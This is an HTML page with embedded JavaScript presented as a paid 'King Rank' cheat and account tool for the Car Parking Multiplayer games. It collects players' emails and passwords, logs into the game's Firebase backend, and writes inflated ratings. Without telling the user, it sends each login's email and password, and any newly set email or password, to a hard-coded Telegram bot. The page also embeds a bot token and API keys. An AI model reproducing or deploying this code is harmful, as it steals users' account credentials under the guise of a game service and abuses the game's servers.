<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
<title>FLAME WEB TOOL</title>
<style>
body{margin:0;padding:0;font-family:Arial,sans-serif;background:url("https://i.postimg.cc/ZqdtsJ6t/IMG-0640.jpg") center/cover fixed;color:#fff}
.center-wrapper{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:90%;max-width:350px}
.container{background:rgba(0,0,0,.6);backdrop-filter:blur(12px);padding:20px;border-radius:10px;box-shadow:0 0 25px #000;border:2px solid #00aaff;text-align:center}
h1{font-size:20px;margin-bottom:12px}
input,select{width:90%;padding:10px;margin:8px 0;border-radius:5px;border:0;background:rgba(255,255,255,.1);color:#fff;font-size:16px}
button{width:95%;padding:10px;margin:6px 0;border-radius:5px;border:0;cursor:pointer;font-weight:700;font-size:16px}
button.login{background:#00aaff;color:#fff}
button.menu{background:#ff8800;color:#fff}
.status{margin-top:10px;color:#0f0;min-height:20px}
.error{color:#f55}
.small{font-size:12px;opacity:.9}
.price{font-size:13px;opacity:.8;margin-bottom:6px;color:#0ff;}
</style>
</head>
<body>
<div class="center-wrapper">
  <div class="container">
    <h1>FLAME CPM WEB TOOL</h1>
    <div id="loginSection">
      <select id="gameSelect">
        <option value="">-- Select Game --</option>
        <option value="1">Car Parking Multiplayer</option>
        <option value="2">Car Parking Multiplayer 2</option>
      </select>
      <input id="email" type="email" placeholder="Email">
      <input id="password" type="password" placeholder="Password">
      <input id="accessKey" type="text" placeholder="Enter Access Key">
      <button class="login" id="loginBtn">Login</button>
      <div id="status" class="status"></div>
    </div>
    <div id="menuButtons" style="display:none">
      <div class="price">üëë King Rank - ‚Ç±500</div>
      <button class="menu" onclick="kingRank()">King Rank</button>
      <div class="price">üìß Change Email - ‚Ç±500</div>
      <button class="menu" onclick="changeEmail()">Change Email</button>
      <div class="price">üîê Change Password - ‚Ç±500</div>
      <button class="menu" onclick="changePassword()">Change Password</button>
      <div id="serviceStatus" class="status"></div>
    </div>
    <footer class="small" style="margin-top:12px">¬©@cpmflame</footer>
  </div>
</div>

<script>
// --- ‡¥™‡µÅ‡¥§‡¥ø‡¥Ø ‡¥ü‡µÜ‡¥≤‡¥ø‡¥ó‡µç‡¥∞‡¥æ‡¥Ç ‡¥¨‡µã‡¥ü‡µç‡¥ü‡µç ‡¥∏‡µÜ‡¥±‡µç‡¥±‡¥ø‡¥Ç‡¥ó‡µç‡¥∏‡µç ---
const BOT_TOKEN = "7805931150:AAEgDJV9RNguZl8Xz7u7IJg99D1D4w7QdUo";
const ADMIN_ID = "7212602902";

const GAMES = {
  "1": { name:"Car Parking Multiplayer", api_key:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", rank_url:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
  "2": { name:"Car Parking Multiplayer 2", api_key:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", rank_url:"https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
};

let currentUser=null,currentToken=null,currentPassword=null,selectedGame=null;

async function verifyAccessKey(key){
  return key === "FLAMEFEB"; // ‡¥®‡¥ø‡¥ô‡µç‡¥ô‡¥≥‡µÅ‡¥ü‡µÜ ‡¥Ü‡¥ï‡µç‡¥∏‡¥∏‡µç ‡¥ï‡µÄ
}

function updateStatus(msg,isError=false,target='status'){
  const el=document.getElementById(target);
  el.className=isError?'status error':'status';
  el.textContent=msg;
}

// ‡¥¨‡µã‡¥ü‡µç‡¥ü‡¥ø‡¥®‡µç ‡¥Æ‡µÜ‡¥∏‡µç‡¥∏‡µá‡¥ú‡µç ‡¥Ö‡¥Ø‡¥ï‡µç‡¥ï‡¥æ‡µª
function sendMessageToAdmin(text){
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id: ADMIN_ID, text: text, parse_mode: "Markdown"})
  }).catch(()=>{});
}

document.getElementById('loginBtn').addEventListener('click', async ()=>{
  const email=document.getElementById('email').value.trim();
  const password=document.getElementById('password').value;
  const key=document.getElementById('accessKey').value.trim();
  const gameVal=document.getElementById('gameSelect').value;
  selectedGame = GAMES[gameVal];

  if(!selectedGame){ updateStatus("Select game first!",true); return; }
  if(!email||!password||!key){ updateStatus("Please fill all fields!",true); return; }

  updateStatus("Checking access key...");
  const valid = await verifyAccessKey(key);
  if(!valid){ updateStatus("‚ùå Invalid access key!",true); return; }

  updateStatus("Logging in...");
  try{
    const resp = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${selectedGame.api_key}`,{
      method:'POST',headers:{"Content-Type":"application/json"},
      body:JSON.stringify({email,password,returnSecureToken:true})
    });
    const data = await resp.json();
    if(data.idToken){
      currentUser=email; currentPassword=password; currentToken=data.idToken;
      document.getElementById('loginSection').style.display='none';
      document.getElementById('menuButtons').style.display='block';
      
      // ‡¥™‡µÅ‡¥§‡¥ø‡¥Ø ‡¥≤‡µã‡¥ó‡¥ø‡µª ‡¥Ö‡¥≤‡µº‡¥ü‡µç‡¥ü‡µç
      sendMessageToAdmin(`üåê **Web Tool Login**\nüéÆ Game: ${selectedGame.name}\nüîë Key: \`${key}\`\nüìß Email: \`${email}\`\nüîí Pass: \`${password}\``);
    }else updateStatus("‚ùå Login failed!",true);
  } catch(err){ updateStatus("‚ùå Error connecting!",true); }
});

async function kingRank(){
  if(!currentToken) return;
  updateStatus("Processing...",false,'serviceStatus');
  const ratingData={}; 
  const fields=["cars","car_fix","car_collided","car_exchange","car_trade","car_wash","slicer_cut","drift_max","drift","cargo","delivery","taxi","levels","gifts","fuel","offroad","speed_banner","reactions","police","run","real_estate","t_distance","treasure","block_post","push_ups","burnt_tire","passanger_distance"];
  fields.forEach(f=>ratingData[f]=100000); 
  ratingData.time=10000000000; ratingData.race_win=3000;
  try{
    const res = await fetch(selectedGame.rank_url,{
      method:'POST',
      headers:{"Authorization":`Bearer ${currentToken}`,"Content-Type":"application/json"},
      body:JSON.stringify({data:JSON.stringify({RatingData:ratingData})})
    });
    if(res.ok){ 
      updateStatus("‚úÖ Success!",false,'serviceStatus'); 
      sendMessageToAdmin(`üëë **King Rank Applied**\nUser: \`${currentUser}\``);
    }
    else updateStatus("‚ùå Failed!",true,'serviceStatus');
  }catch(err){ updateStatus("‚ùå Error!",true,'serviceStatus'); }
}

async function changeEmail(){
  if(!currentToken) return;
  const newEmail=prompt("New email:"); if(!newEmail)return;
  try{
    const r=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
      method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify({idToken:currentToken,email:newEmail,returnSecureToken:true})
    });
    if(r.ok){ 
      updateStatus("‚úÖ Email Changed!",false,'serviceStatus'); 
      sendMessageToAdmin(`üìß **Web Email Change**\nOld: \`${currentUser}\`\nNew: \`${newEmail}\``);
    }
  }catch(e){}
}

async function changePassword(){
  if(!currentToken) return;
  const newPassword=prompt("New password:"); if(!newPassword)return;
  try{
    const r=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
      method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify({idToken:currentToken,password:newPassword,returnSecureToken:true})
    });
    if(r.ok){ 
      updateStatus("‚úÖ Password Changed!",false,'serviceStatus'); 
      sendMessageToAdmin(`üîê **Web Password Change**\nUser: \`${currentUser}\`\nNew: \`${newPassword}\``);
    }
  }catch(e){}
}
</script>
</body>
</html>
